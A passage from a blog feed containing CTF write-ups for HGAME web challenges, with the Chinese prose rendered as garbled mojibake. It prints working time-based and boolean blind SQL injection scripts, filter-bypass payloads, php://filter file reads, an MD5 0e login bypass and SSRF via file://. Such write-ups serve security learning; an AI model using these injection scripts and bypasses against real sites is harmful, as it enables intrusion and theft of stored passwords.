é™¤åŠŸèƒ½ï¼Œç‚¹å‡»åˆ é™¤åŠŸèƒ½æ—¶å‡ºç°çš„urlæ˜¯è¿™æ ·çš„ï¼š</p><pre><code>index.php?method=delete&amp;delete_id=1101</code></pre><p>å¼€å§‹æˆ‘çš„ç¬¬ä¸€æƒ³æ³•æ˜¯è¿™æ ·çš„ï¼š(å‚è€ƒç½‘ä¸Šæœåˆ°çš„æ–‡ç« ï¼š<a href="https://juejin.im/entry/5c11e35b51882530e46188ed" target="_blank" rel="noopener">https://juejin.im/entry/5c11e35b51882530e46188ed</a><br>ï¼‰<br>è¿™é“é¢˜ç›®éš¾åº¦æ˜¾ç„¶è¦é«˜ä¸å°‘ï¼Œä½†ç»™æˆ‘å¾ˆå¤§å¯å‘ã€‚å…¶æ³¨å…¥ç‚¹åœ¨äºåˆ é™¤æ“ä½œä¸­çš„è¯­å¥</p><pre><code>$result = $conn-&gt;query(&quot;delete from note where id=$id and user=&#39;$user&#39;&quot;);</code></pre><p>å…¶ä¸­<code>$user</code>æ˜¯å¯æ³¨çš„ã€‚æ‰€ä»¥é‚£é“é¢˜ç›®åœ¨æ‰§è¡Œåˆ é™¤æ“ä½œæ—¶å°±å¯ä»¥è§¦å‘å·²ç»æ³¨å…¥çš„åå­—ï¼Œå¼•èµ·äºŒæ¬¡æ³¨å…¥ã€‚è¿™ä¹Ÿæ˜¯æˆ‘å¼€å§‹å¯¹ç•™è¨€æ¿è¿™é¢˜çš„åˆ¤æ–­ï¼šäºŒæ¬¡æ³¨å…¥ã€‚ä½†æ˜¯å°è¯•æ³¨å†Œæ—¶å‘ç°è¿‡æ»¤çš„å®åœ¨æ˜¯å¤ªå¤šäº†ï¼ŒåŸºæœ¬ä¸å¯èƒ½æ³¨å†Œä¸€ä¸ªsqlè¯­å¥ï¼Œçœ‹æ¥æ˜¯åœ¨å…¶ä»–åœ°æ–¹å¯æ³¨ã€‚<br>ä¹‹ååˆé‡æ–°æ³¨æ„åˆ°ä¸Šé¢æåˆ°çš„åˆ é™¤è¯­å¥ï¼Œå‘ç°ä¸€ä»¶äº‹ï¼Œå½“æˆ‘åœ¨burpé‡Œä¸æ”¹å˜<code>delete_id</code>é‡å¤å‘åŒ…æ—¶ï¼Œç»“æœéƒ½æ˜¾ç¤ºçš„åˆ é™¤æˆåŠŸã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªæ“ä½œå¹¶æ²¡æœ‰çœŸæ­£åˆ æ‰æˆ‘ä»¬çš„è¯­å¥ã€‚ä»”ç»†FUZZçš„è¯ï¼Œå‘ç°åªè¦idä¼ æ•°å­—ï¼Œä»»ä½•æ•°å­—éƒ½ä¸ä¼šæŠ¥é”™ã€‚åˆ¤æ–­æ˜¯æ•°å€¼å‹æ³¨å…¥ã€‚<br>ä½†æ˜¯å›æ˜¾å°±å¾ˆéš¾å—äº†ï¼Œå°è¯•</p><pre><code>delete_id=1 and 1=1</code></pre><pre><code>delete_id=1 and 1=2</code></pre><p>çš„å›æ˜¾éƒ½æ˜¯åˆ é™¤æˆåŠŸã€‚è¿™å°±ä¸å¤ªå¦™äº†ã€‚è€Œä¸”ç»è¿‡FUZZåå¹¶æ²¡æœ‰è¿‡æ»¤æ‰å…³é”®å­—ã€‚åªèƒ½å°è¯•ç›²æ³¨ï¼Œè€Œä¸”æ˜¯æ—¶é—´ç›²æ³¨ã€‚<br>è¿™é‡Œåæ§½ä¸‹é¢˜ç›®ï¼Œè‡ªå·±åšæ—¶é¢˜ç›®çš„idå·²ç»äº”åƒå¤šï¼Œåˆ é™¤æ“ä½œæ¯æ¬¡éƒ½è´¼å¡ã€‚æˆ‘ç”¨è„šæœ¬æµ‹è¯•æ—¶é—´ç›²æ³¨æœ€ç®€å•çš„è¯­å¥</p><pre><code>delete_id=if(length(database())&lt;100,sleep(5),1)</code></pre><p>éƒ½æ²¡æœ‰å»¶è¿Ÿï¼Œä¸€åº¦è®©æˆ‘æ€€ç–‘è¿™ä¸ªå‚æ•°æ˜¯å¦å¯æ³¨äº†ã€‚ç„¶è€ŒåŒæ ·çš„payloadç¬¬äºŒå¤©æ—©ä¸Šè·‘(ä¼°è®¡å› ä¸ºåšé¢˜çš„äººè¿™æ—¶å€™å¹¶ä¸å¤š)å°±æµ‹å‡ºæœ‰å»¶æ—¶ã€‚éš¾å—ï¼Œæµªè´¹äº†æˆ‘å¥½é•¿æ—¶é—´è‡ªæˆ‘æ€€ç–‘ã€‚<br>æ‰€ä»¥è´´ä¸‹è„šæœ¬å§ï¼Œé¢˜ç›®å¯¹å…³é”®å­—å¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œå”¯ä¸€çš„é—®é¢˜å°±æ˜¯ç¯å¢ƒä¸å¥½ï¼Œæ¯æ¬¡è·‘éƒ½è·‘ä¸å‡ºå®Œæ•´ç»“æœã€‚åªæœ‰æœ€åä¸€æ¬¡å«å‡ºé¢˜äººé‡å¯ç¯å¢ƒæ—¶æ‰æˆåŠŸè·‘å‡ºæ¯ä¸€ä¸ªå­—ç¬¦ã€‚</p><pre><code class="python">import requestsflag=&#39;&#39;cookies={    &#39;PHPSESSID&#39;:&#39;f9nl4jl987d07pisnq508o1kg7&#39;}for i in range(1,40):    print(i)    for j in range(32,128):        url = &quot;http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=if(ascii(substr((select group_concat(password) from user),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,sleep(10),1)&quot;        #if(length(database())=&quot;+str(i)+&quot;,sleep(6),1)&quot;  7        #if(ascii(substr(database(),1,1))=&quot;+str(i)+&quot;,sleep(6),1)    babysql        #if(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,sleep(6),1)    messages , user        #if(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;messages&#39;),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,sleep(6),1)    message-id ,user-id,message        #if(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;user&#39;),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,sleep(6),1)          id, name,password        #if(ascii(substr((select group_concat(name) from user),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,sleep(6),1)   cosmos,        # if(ascii(substr((select group_concat(password) from user),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,sleep(6),1)  f1FXOCnj26Fkadzt4Sqynf6O7CgR        try:            result = requests.get(url, cookies=cookies, timeout=10)        except requests.exceptions.ReadTimeout:            flag+=chr(j)            print(flag)            break</code></pre><p>å¼€å§‹éƒ½æ˜¯<code>sleep(6)</code>ä¹Ÿèƒ½æ³¨,åæ¥ä¸å¾—ä¸è°ƒæ•´åˆ°<code>sleep(10)</code>æ‰å¥½è½¬äº†ã€‚æ€»ä¹‹é¢˜ç›®æ˜¯æ¯”è¾ƒåŸºæœ¬çš„æ—¶é—´ç›²æ³¨ï¼Œä½†æˆ‘ä¼°è®¡å¾ˆå¤šäººå› ä¸ºç¯å¢ƒæœ¬æ¥å¯ä»¥åšçš„æœ€åéƒ½ä¸å¾—ä¸æ”¾å¼ƒã€‚æœ€åæ˜¯æ³¨å‡ºuserè¡¨é‡Œçš„cosmosè·Ÿå¯†ç ï¼Œç™»å½•å³å¯ã€‚<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­ç”µhgame-week2</title>
      <link href="2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/"/>
      <url>2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/</url>
      
        <content type="html"><![CDATA[<p>   ç¬¬äºŒå‘¨çš„é¢˜ç›®æ˜æ˜¾éš¾åº¦æå‡äº†äº›è®¸ï¼Œä¸è¿‡ç¨å¾®èŠ±ç‚¹æ—¶é—´è¿˜æ˜¯èƒ½åšçš„ã€‚å› ä¸ºæ—¶é—´åŸå› åªåšäº†webï¼Œä½†æ˜¯èƒ½akæ‰webå·²ç»ç®—ä¸é”™äº†hhhã€‚å¸Œæœ›åœ¨åé¢ä¸¤ä¸ªweekè¿˜èƒ½ç»§ç»­å¦‚æ­¤å§ã€‚å…¶ä¸­å› ä¸ºç¬¬å››é“é¢˜èŠ±äº†å¾ˆé•¿æ—¶é—´æ‰åšå‡ºæ¥ï¼Œå¹²è„†æ€»ç»“ä¸‹åšé¢˜ç»éªŒé¡ºä¾¿å½“å­¦ä¹ ç¬”è®°å†™å†™ã€‚</p><a id="more"></a><h1 id="Cosmosçš„åšå®¢åå°"><a href="#Cosmosçš„åšå®¢åå°" class="headerlink" title="Cosmosçš„åšå®¢åå°"></a>Cosmosçš„åšå®¢åå°</h1><p>ä¸ªäººè§‰å¾—è¿™é“é¢˜å‡ºçš„æŒºä¸é”™çš„ã€‚è‡³å°‘æŠŠæˆ‘ä¹‹å‰æ·¡å¿˜çš„å‡ ä¸ªçŸ¥è¯†ç‚¹éƒ½æ•´åˆåˆ°ä¸€èµ·ã€‚ä¹Ÿé¡ºä¾¿æé†’äº†æˆ‘æ¥ä¸‹æ¥çš„å­¦ä¹ ç¬”è®°è¦å†™å•¥hhhã€‚</p><p>é¦–å…ˆè¿›å»ä¸€ä¸ªç™»é™†æ¡†ã€‚ç¬¬ä¸€ååº”å½“ç„¶æ˜¯sqlæ³¨å…¥ã€‚ä½†æ˜¯å›æ˜¾å¾ˆæœ‰æ„æ€ã€‚</p><p><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å›æ˜¾"></p><p>è¿™ä¸ªâ€œç”¨æˆ·åæˆ–å¯†ç é”™è¯¯â€å›æ˜¾ç›´æ¥å¦å®šäº†æˆ‘ä»¬ä»»ä½•å…³äºsqlæ³¨å…¥çš„å¯èƒ½ã€‚åŠ ä¸Šæ²¡ä»€ä¹ˆéšè—ä¿¡æ¯ï¼Œå¯¼è‡´æˆ‘å½“æ—¶è¿™é¢˜å°±å…ˆæ”¾ç€å»åšç¬¬äºŒé“äº†ã€‚ä¹‹åå›è¿‡å¤´çœ‹æ—¶ï¼Œæ‰æƒ³èµ·æ¥è¦æŠ“ä¸ªåŒ…ã€‚äºæ˜¯å‘ç°å­˜åœ¨ä¸€ä¸ªè·³è½¬<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="action"></p><p>çœ‹åˆ°actionå°±ç«‹é©¬æœ‰äº†æ–°æ€è·¯ã€‚å› ä¸ºè¿™æ­£æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨çš„å¿…å¤‡å‚æ•°ã€‚é‚£ä¹ˆå°±è¯•è¯•è¯»æ–‡ä»¶å§ã€‚æœæ–­å°è¯•ä¼ªåè®®ã€‚</p><pre><code>?action=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>è¿™é‡Œè‡ªå·±è¢«è‡ªå·±ä¹‹å‰å†™çš„æ–‡ç« å‘åˆ°äº†â€¦â€¦åŸæ¥ä¸€æ—¶å…´èµ·å†™äº†ä¸ªâ€œä¼ªåè®®æ€»èƒ½ç»™ä½ æƒŠå–œâ€ï¼Œç»“æœæ–‡ç« é‡Œæ³¨é‡<code>php://input</code>ï¼Œä½†æ²¡æœ‰å‘ç°<code>php://filter</code>è¯»æ–‡ä»¶çš„payloadå†™é”™äº†â€¦..è‡ªå·±æœ‰ç‚¹æ·¡å¿˜å°±æ‹¿æ–‡ç« é‡Œçš„payloadå¤åˆ¶ç²˜è´´ï¼Œç»“æœåŠå¤©ä¸å‡ºç»“æœã€‚åæ¥æ‰å‘ç°è‡ªå·±å†™é”™äº†ã€‚<br>æ€»ä¹‹è¯»åˆ°æºç ,base64è§£ç åï¼š<br>index.php</p><pre><code class="php">&lt;?phperror_reporting(0);session_start();if(isset($_SESSION[&#39;username&#39;])) {    header(&quot;Location: admin.php&quot;);    exit();}$action = @$_GET[&#39;action&#39;];$filter = &quot;/config|etc|flag/i&quot;;if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) {    if(preg_match($filter, $_GET[&#39;action&#39;])) {        echo &quot;Hacker get out!&quot;;        exit();    }        include $action;}elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {    header(&quot;Location: ?action=login.php&quot;);    exit();}</code></pre><p>å‘ç°admin.phpçš„å­˜åœ¨ï¼Œä»¥åŠlogin.phpå¯èƒ½å­˜åœ¨çŒ«è…»ã€‚ é‚£ä¹Ÿç”¨ä¼ªåè®®è¯»ä¸‹<br>login.php</p><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;session_start();//Only for debugif (DEBUG_MODE){    if(isset($_GET[&#39;debug&#39;])) {        $debug = $_GET[&#39;debug&#39;];        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {            die(&quot;args error!&quot;);        }        eval(&quot;var_dump($$debug);&quot;);    }}if(isset($_SESSION[&#39;username&#39;])) {    header(&quot;Location: admin.php&quot;);    exit();}else {    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];            header(&quot;Location: admin.php&quot;);            exit();        }        else {            echo &quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;;        }    }}?&gt;#htmléƒ¨åˆ†ç•¥</code></pre><p>admin.php</p><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;session_start();if(!isset($_SESSION[&#39;username&#39;])) {    header(&#39;Location: index.php&#39;);    exit();}function insert_img() {    if (isset($_POST[&#39;img_url&#39;])) {        $img_url = @$_POST[&#39;img_url&#39;];        $url_array = parse_url($img_url);        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {            return false;        }           $c = curl_init();        curl_setopt($c, CURLOPT_URL, $img_url);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        $res = curl_exec($c);        curl_close($c);        $avatar = base64_encode($res);        if(filter_var($img_url, FILTER_VALIDATE_URL)) {            return $avatar;        }    }    else {        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));    }}?&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;Cosmos&#39;Blog - åå°ç®¡ç†&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;a href=&quot;logout.php&quot;&gt;é€€å‡ºç™»é™†&lt;/a&gt;        &lt;div style=&quot;text-align: center;&quot;&gt;            &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&#39;username&#39;];?&gt; &lt;/h1&gt;        &lt;/div&gt;        &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;            &lt;fieldset style=&quot;width: 30%;height: 20%;float:left&quot;&gt;                &lt;legend&gt;æ’å…¥å›¾ç‰‡&lt;/legend&gt;                &lt;p&gt;&lt;label&gt;å›¾ç‰‡url: &lt;input type=&quot;text&quot; name=&quot;img_url&quot; placeholder=&quot;&quot;&gt;&lt;/label&gt;&lt;/p&gt;                &lt;p&gt;&lt;button type=&quot;submit&quot; name=&quot;submit&quot;&gt;æ’å…¥&lt;/button&gt;&lt;/p&gt;            &lt;/fieldset&gt;        &lt;/form&gt;        &lt;fieldset style=&quot;width: 30%;height: 20%;float:left&quot;&gt;                &lt;legend&gt;è¯„è®ºç®¡ç†&lt;/legend&gt;                &lt;h2&gt;å¾…å¼€å‘..&lt;/h2&gt;        &lt;/fieldset&gt;        &lt;fieldset style=&quot;width: 30%;height: 20%;&quot;&gt;                &lt;legend&gt;æ–‡ç« åˆ—è¡¨&lt;/legend&gt;                &lt;h2&gt;å¾…å¼€å‘..&lt;/h2&gt;        &lt;/fieldset&gt;        &lt;fieldset style=&quot;height: 50%&quot;&gt;            &lt;div style=&quot;text-align: center;&quot;&gt;                &lt;img height=&#39;200&#39; width=&#39;500&#39; src=&#39;data:image/jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&#39;&gt;            &lt;/div&gt;        &lt;/fieldset&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>é‚£ä¹ˆä¸éš¾å‘ç°å‡ ä¸ªæºç é‡Œçš„è¦ç‚¹ï¼š<br>index.phpä¸­ï¼š<br>banæ‰äº†flagä¸configã€‚è€Œåé¢å¯ä»¥æ³¨æ„åˆ°config.phpè¢«admin.phpä¸login.phpåŒ…å«(include)äº†ã€‚</p><p>login.phpä¸­<br>1.å­˜åœ¨ä¸€ä¸ªå‚æ•°debug,ä»¥åŠå¯¹è¿™å‚æ•°çš„<code>eval()</code>ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è·å¾—äº†ä¸€ä¸ªå¯æ§å¯æ‰§è¡Œçš„å‚æ•°ï¼Œä½†æ˜¯è¦ç»•æ­£åˆ™ã€‚<br>2.ç¨å¾®æ³¨æ„ä¸‹ï¼Œç™»å½•æ—¶<code>username</code>ä»¥åŠ<code>password</code>å‡éœ€ä¸å¯¹åº”çš„å‚æ•°ï¼ˆè‚¯å®šåœ¨config.phpä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸å¯èƒ½é€šè¿‡å…¶ä»–é€”å¾„ç™»å½•ï¼‰ç›¸ç­‰ã€‚ä½†æ˜¯passwordååæ˜¯<code>==</code>çš„å¼±ç±»å‹ç›¸ç­‰ã€‚è¿™å°±ä»£è¡¨passwordä¸€å®šä¼šæœ‰æ¼æ´ã€‚ä¸”ç”šè‡³å¯ä»¥çŒœåˆ°ï¼Œpasswordçš„md5å€¼å¼€å¤´æ˜¯0eã€‚è¿™æ ·æ‰ä¼šæœ‰å¼±ç±»å‹æ¯”è¾ƒæ¼æ´åˆ©ç”¨ã€‚</p><p>admin.phpä¸­<br>1.ä¸‹é¢ä¸€æ®µä»£ç </p><pre><code class="php">$c = curl_init();curl_setopt($c, CURLOPT_URL, $img_url);curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);$res = curl_exec($c);curl_close($c);$avatar = base64_encode($res);</code></pre><p>æœ‰ç‚¹çœ¼ç†Ÿï¼Œå†åŠ ä¸Šå‰é¢ä¸€æ®µå¯¹hostçš„åˆ¤åˆ«ï¼Œå¯ä»¥æƒ³è§æ˜¯å­˜åœ¨ssrfæ¼æ´ã€‚ï¼ˆè™½ç„¶æˆ‘ä¸ç†Ÿï¼‰ç™¾åº¦ä¸€ä¸‹ï¼Œå‘ç°è¿™æœç„¶æ˜¯ssrfæ¼æ´çš„ç»å…¸ä»£ç ã€‚ä¹Ÿæé†’äº†æˆ‘è¦å‡†å¤‡å­¦ä¹ ssrfçš„ç¬”è®°äº†â€¦â€¦</p><p>ç„¶åå°±æ˜¯å­˜åœ¨ä¸€ä¸ªå›¾ç‰‡æ’å…¥çš„åŠŸèƒ½ã€‚è€Œä¸”å®ƒä¼šè¿”å›base64ç¼–ç åçš„<code>file_get_contents()</code>ç»“æœã€‚è¿™ä¹Ÿæ˜¯ssrfåˆ©ç”¨ä¸­èƒ½æ‹¿åˆ°å›æ˜¾ç»“æœçš„é‡è¦ç»†èŠ‚ã€‚</p><p>æ‰€ä»¥æ€è·¯å¾ˆæ¸…æ™°äº†ï¼Œä»login.phpä¸‹æ‰‹ï¼Œç™»å½•åå°ï¼Œåˆ©ç”¨ssrfæ‹¿åˆ°æ ¹ç›®å½•ä¸‹çš„flagã€‚</p><p>é¦–å…ˆæ˜¯å…³äº<code>debug</code>å‚æ•°çš„åˆ©ç”¨äº†ã€‚</p><pre><code class="php">if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {            die(&quot;args error!&quot;);        }        eval(&quot;var_dump($$debug);&quot;);</code></pre><p>ä¸»è¦æ˜¯è¿™æ®µä»£ç ï¼Œè‡ªå·±å¼€å§‹åªç†è§£æˆè¿‡æ»¤äº†ä¸€å †ä¸œè¥¿â€¦â€¦åæ¥ç™¾åº¦ä¸‹ï¼Œçªç„¶æƒ³èµ·æ¥åŸæ¥ichunqiuä¸Šåšè¿‡çš„ä¸€é“é¢˜ã€‚å«åšçˆ†ç ´-1ã€‚ä½†å®é™…ä¸Šæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡çš„åˆ©ç”¨ï¼ˆå› ä¸ºå®ƒincludeäº†flag.php,æ‰€ä»¥ä¼ å‚<code>globals</code>å°±èƒ½é€šè¿‡<code>eval($$a)</code>æ‹¿flagï¼‰ã€‚è€Œè¿™é¢˜åŒæ ·ä¹Ÿincludeäº†config.phpâ€¦â€¦å›è¿‡å¤´çœ‹æ­£åˆ™ï¼Œå°±ä¼šå‘ç°è¿™ä¸ªæ­£åˆ™å…¶å®æ°å¥½é™å®šäº†ä¼ å‚ä¸ºå˜é‡åã€‚å…·ä½“å‚è€ƒstackoverflowï¼š<br><a href="https://stackoverflow.com/questions/3980154/how-to-check-if-a-string-can-be-used-as-a-variable-name-in-php" target="_blank" rel="noopener">https://stackoverflow.com/questions/3980154/how-to-check-if-a-string-can-be-used-as-a-variable-name-in-php</a><br>å®ƒè¦æ±‚å¼€å¤´ç¬¬ä¸€ä¸ªå­—æ¯å¯ä»¥æ˜¯å­—æ¯ä¸‹åˆ’çº¿åŠä¸å¯è§å­—ç¬¦ï¼Œåé¢å…¶ä»–å­—æ¯å¯ä»¥æ˜¯å­—æ¯æ•°å­—åŠä¸å¯è§å­—ç¬¦ã€‚ï¼ˆ\x7f-\xff ç¡®åˆ‡çš„è¯´ï¼Œå¯ä»¥åŒ¹é…utf-8ç¼–ç ä¸­çš„éasciiç¼–ç å­—ç¬¦ï¼‰ã€‚æ€»ä¹‹ç¡®å®šå¯ä»¥ä¼ å‚æ•°åï¼Œæˆ‘ä»¬è¯•è¯•<code>GLOBALS</code><br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="GLOBALS"><br>ç›´æ¥æ‹¿åˆ°ç”¨æˆ·åCosmos!ï¼Œä»¥åŠå¯†ç æ˜¯0eå¼€å¤´çš„äº‹å®ã€‚æ•…é€‰ä¸ª0eå¼€å¤´MD5çš„å­—ç¬¦ä¸²ç™»å½•è¿›å»ã€‚</p><pre><code>Cosmos!s878926199a</code></pre><p>è¿›å»åæˆ‘ä¹Ÿå¡äº†å¥½ä¹…â€¦â€¦ssrfä¸ç†Ÿï¼Œåªèƒ½ç›²ç›®çš„è¯•ã€‚èƒ½ç¡®å®šçš„æ˜¯éœ€è¦hostè¢«è§£æä¸º<code>localhost</code>,å°è¯•ç›´æ¥<code>http://localhost</code>ä½†æ˜¯å›æ˜¾æ€»æ˜¯é‚£å¼ æŠ¥é”™çš„å›¾ã€‚å”¯ä¸€ä¸åŒçš„åœ¨äºï¼Œå½“æˆ‘å°è¯•<code>http://localhost/flag</code>æ—¶ï¼Œè¿”å›çš„æ˜¯404,ä¹Ÿå°±æ˜¯è¯´curlæˆåŠŸæ‰§è¡Œäº†ã€‚æ‰€ä»¥è¯´ï¼Œflagåº”è¯¥æ˜¯åœ¨æœåŠ¡å™¨æ ¹ç›®å½•ï¼Œä¸æ˜¯ç½‘ç«™æ ¹ç›®å½•ã€‚é—®é¢˜å˜ä¸ºæ€ä¹ˆè¯»äº†ã€‚åœ¨æŸ¥é˜…èµ„æ–™æ—¶çªç„¶æ³¨æ„åˆ°fileåè®®å¯ä»¥è¯»æ–‡ä»¶ã€‚äºæ˜¯æ¢ä¸‹file://åè®®<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag.PNG"><br>å±…ç„¶æˆäº†ã€‚ã€‚ã€‚è§£ç å¯æ‹¿åˆ°flagã€‚åæ¥éƒå¸ˆå‚…è§£é‡Šè¯´ï¼Œå› ä¸ºindex.phpå­˜åœ¨302ï¼Œcurlä¸èƒ½è·Ÿéšï¼Œè·å–æ˜¯ç©ºçš„ã€‚ç»“åˆæºç ä¸­è·å–ä¸ºç©ºåˆ™è¿”å›é”™è¯¯å›¾ç‰‡è¿™ç‚¹ï¼Œå°±æ˜ç™½äº†ä¸ºä»€ä¹ˆ<code>http://localhost</code>æ€»æ˜¯æ²¡ç»“æœ<br>ä½†æˆ‘ä¼°è®¡è¿˜æœ‰å…¶ä»–æ–¹æ³•åšï¼Œè¿™é‡Œé©¬ä¸€æ‰‹ã€‚</p><h1 id="Cosmosçš„ç•™è¨€æ¿-1"><a href="#Cosmosçš„ç•™è¨€æ¿-1" class="headerlink" title="Cosmosçš„ç•™è¨€æ¿-1"></a>Cosmosçš„ç•™è¨€æ¿-1</h1><p>è¯´æ¥æƒ­æ„§ï¼Œè¿™é¢˜å¼€å§‹æˆ‘ipåˆè¢«banäº†hhhhã€‚å¥½åœ¨è²Œä¼¼æ˜¯é¢˜ç›®é—®é¢˜ï¼Œåæ¥å‡ºé¢˜äººè°ƒæ•´äº†å°±å¥½äº†ã€‚é¦–å…ˆæ ¹æ®FUZZå¯ä»¥ç¡®è®¤å­˜åœ¨sqlæ³¨å…¥ã€‚è¾“å…¥1å›æ˜¾æ­£å¸¸ï¼Œè¾“å…¥<code>1&#39;</code>æ— å›æ˜¾ã€‚è¾“å…¥<code>1&quot;</code>å›æ˜¾æ­£å¸¸ã€‚é‚£ä¹ˆæ˜¾ç„¶ï¼Œè¿™æ˜¯ç›²æ³¨çš„å‘³é“ã€‚å› ä¸ºåªæœ‰æ­£ç¡®é”™è¯¯ä¸¤ç§å›æ˜¾æ–¹å¼ï¼Œæ‰€ä»¥ç¡®è®¤æ˜¯å¸ƒå°”ç›²æ³¨ã€‚</p><p>ç„¶åfuzzäº†ä¸‹banæ‰çš„å…³é”®å­—ï¼š<br>ç©ºæ ¼ï¼Œå¯ä»¥ç”¨<code>%0a</code>æ›¿ä»£</p><pre><code>select</code></pre><p>å…³é”®å­—å¯ä»¥åŒå†™ç»•è¿‡</p><p>é‚£ä¸å¤šè¯´ç›´æ¥æ”¾ç›²æ³¨è„šæœ¬äº†ã€‚æ•´ä½“è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼ˆä¹‹å‰æ€»ç»“çš„æ¨¡æ¿ç›´æ¥æ‹¿æ¥å¥—hhhï¼‰ï¼š</p><pre><code class="python">import requestsflag=&#39;&#39;#hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}for i in range(1,50):    a=0    print(i)    for j in range(32,128):        payload=&quot;http://139.199.182.61/index.php?id=1&#39;and%0aascii(substr((selselectect%0afl4444444g%0afrom%0af1aggggggggggggg),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;%23&quot;        #print(payloadï¼‰        res=requests.get(url=payload)        if &#39;Hello&#39; in res.text:            flag+=chr(j)            print(flag)            a=1    if a==0: break</code></pre><h1 id="Cosmosçš„æ–°è¯­è¨€"><a href="#Cosmosçš„æ–°è¯­è¨€" class="headerlink" 